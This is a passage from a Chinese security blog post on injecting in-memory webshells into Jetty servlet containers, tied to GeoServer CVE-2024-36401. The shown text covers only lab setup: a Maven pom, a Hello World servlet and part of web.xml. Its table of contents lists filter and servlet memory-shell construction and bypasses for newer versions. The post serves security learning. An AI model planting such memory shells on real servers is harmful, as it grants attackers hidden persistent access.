<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="jetty类型的内存马，这是一个不同于tomcat的轻量级web容器。具体来说，Jetty 是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。">
<meta property="og:type" content="article">
<meta property="og:title" content="Jetty内存马">
<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="f4nx1ng&#39;s blog">
<meta property="og:description" content="jetty类型的内存马，这是一个不同于tomcat的轻量级web容器。具体来说，Jetty 是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/1.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/2.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/3.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/4.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/5.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/6.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/7.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/8.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/9.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/10.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/11.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/12.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/13.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/14.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/15.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/16.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/17.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/19.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/20.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/21.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/22.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/23.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/24.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/25.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/26.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/27.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/28.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/29.jpg">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/30.jpg">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/31.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/32.jpg">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/33.jpg">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/34.jpg">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/35.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/36.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/37.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/38.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/39.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/40.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/41.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/42.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/43.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/44.png">
<meta property="article:published_time" content="2024-08-02T08:25:58.000Z">
<meta property="article:modified_time" content="2024-08-03T07:25:46.973Z">
<meta property="article:author" content="f4nx1ng">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/1.png">


<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2024/08/02/Jetty内存马/","title":"Jetty内存马"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Jetty内存马 | f4nx1ng's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">f4nx1ng's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">22</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">23</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#jetty%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.</span> <span class="nav-text">Jetty注入内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#filter%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">Filter分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.4.</span> <span class="nav-text">filter内存马实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90"><span class="nav-number">1.5.</span> <span class="nav-text">问题分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%97%AE%E9%A2%98"><span class="nav-number">1.6.</span> <span class="nav-text">问题解答（类加载器的命名空间问题）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">1.6.1.</span> <span class="nav-text">额外的问题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.7.</span> <span class="nav-text">最终Filter内存马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#serlevt%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E6%9E%84%E9%80%A0"><span class="nav-number">1.8.</span> <span class="nav-text">Serlevt内存马分析构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-number">1.9.</span> <span class="nav-text">高版本利用绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.10.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">f4nx1ng</p>
  <div class="site-description" itemprop="description">A big noob</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="f4nx1ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="f4nx1ng's blog">
      <meta itemprop="description" content="A big noob">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Jetty内存马 | f4nx1ng's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Jetty内存马
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-08-02 16:25:58" itemprop="dateCreated datePublished" datetime="2024-08-02T16:25:58+08:00">2024-08-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-08-03 15:25:46" itemprop="dateModified" datetime="2024-08-03T15:25:46+08:00">2024-08-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>jetty类型的内存马，这是一个不同于tomcat的轻量级web容器。具体来说，Jetty
是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。</p>
<span id="more"></span>
<h3 id="jetty注入内存马">Jetty注入内存马</h3>
<p>首发与先知社区：https://xz.aliyun.com/t/15141</p>
<h4 id="前言">前言</h4>
<p>最近在学习geoserver的CVE-2024-36401注入内存马的时候，发现需要注入jetty类型的内存马，这是一个不同于tomcat的轻量级web容器。具体来说，Jetty
是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。</p>
<h4 id="环境搭建">环境搭建</h4>
<p>因为我本身并不熟悉jetty的内容，所以这里把有关环境部署的部分也记录下来了，使用IDEA的maven
Archetype创建webapp模板的应用程序模板，如下所示：</p>
<img data-src="/2024/08/02/Jetty%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class>
<p>然后编写pom文件当中的内容，引入jetty的相关依赖。我的pom文件内容如下所示。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JettyMemshell<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>JettyMemshell Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--建议更换成9.0.7.v20131107不会出现后续问题分析的钱一个问题--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jetty.version</span>&gt;</span>9.4.44.v20210927<span class="tag">&lt;/<span class="name">jetty.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-servlet<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>JettyMemshell<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.eclipse.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">httpConnector</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scanIntervalSeconds</span>&gt;</span>10<span class="tag">&lt;/<span class="name">scanIntervalSeconds</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">webApp</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">webApp</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后编写一个简单的servlet来观察这个应用程序是否能够按照预期进行正常运行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanxing.servlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        res.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        res.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">        res.getWriter().println(<span class="string">&quot;&lt;h1&gt;Hello World&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后配置一下web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span 